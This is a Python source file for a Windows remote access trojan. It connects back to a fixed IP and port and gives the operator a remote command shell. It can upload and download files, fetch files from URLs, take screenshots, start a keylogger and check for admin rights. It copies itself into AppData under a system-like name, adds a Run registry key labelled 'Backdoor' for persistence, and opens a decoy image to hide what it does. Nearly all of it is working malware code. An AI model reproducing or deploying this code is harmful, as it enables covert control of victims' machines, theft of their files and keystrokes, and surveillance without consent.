#!/usr/bin/python3
import socket
import subprocess
import json
import time
import threading
import os
import shutil
import sys
import base64
import requests
import ctypes
from mss import mss

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())

def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data += sock.recv(1024).decode()
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue

def has_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'), 'temp']))
        admin = "[+] Administrator Privileges!"
    except:
        admin = "[!!] User Privileges!"

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_response.content)

def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(("192.168.1.112", 54321))
            shell()
        except:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            try:
                os.remove(keylogger_path)
            except:
                pass
            break
        elif command == "help":
            help_options = '''
            download path   -> Download a file from Target PC
            upload path     -> Upload a file to Target PC
            get url         -> Download a File to Target From Any Website
            start path      -> Start a Program on Target PC
            screenshot      -> Take a Screenshot of Target Monitor
            keylog_start    -> Start Keylogger On Target machine
            keylog_dump     -> Show logged Keys  
            check           -> Check For Administrator Privileges
            q               -> q will exit the Shell
            '''
            reliable_send(help_options)
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()).decode())
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                result = reliable_recv()
                fin.write(base64.b64decode(result))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Downloaded File from Specified URL")
            except:
                reliable_send("[!!] Failed to Download File")
        elif command[:5] == "start":
            try:   
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started!")
            except:
                reliable_send("[!!] Failed to start!")
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()).decode())
                os.remove("monitor-1.png")
            except:
                reliable_send("[!!] Failed to take Screenshot")
        elif command[:5] == "check":
            try:
                has_admin()
                reliable_send(admin)
            except:
                reliable_send("Can't Perform the check")
        elif command[:12] == "keylog_start":
            # Assuming `keylogger.start()` is defined elsewhere
            t1 = threading.Thread(target=keylogger.start)
            t1.start()
        elif command[:11] == "keylog_dump":
            with open(keylogger_path, "r") as fn:
                reliable_send(fn.read())
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result.decode())
            except Exception as e:
                reliable_send(f"[!!] Can't Execute That Command: {str(e)}")

# Configuration for persistence
keylogger_path = os.environ["appdata"] + "\\windowsprocess.txt"
location = os.environ["appdata"] + "\\Windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable, location)
    subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
    name = sys._MEIPASS + "\\image.jpg"
    try:
        subprocess.Popen(name, shell=True)
    except:
        pass

# Socket setup
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
connection()
sock.close()
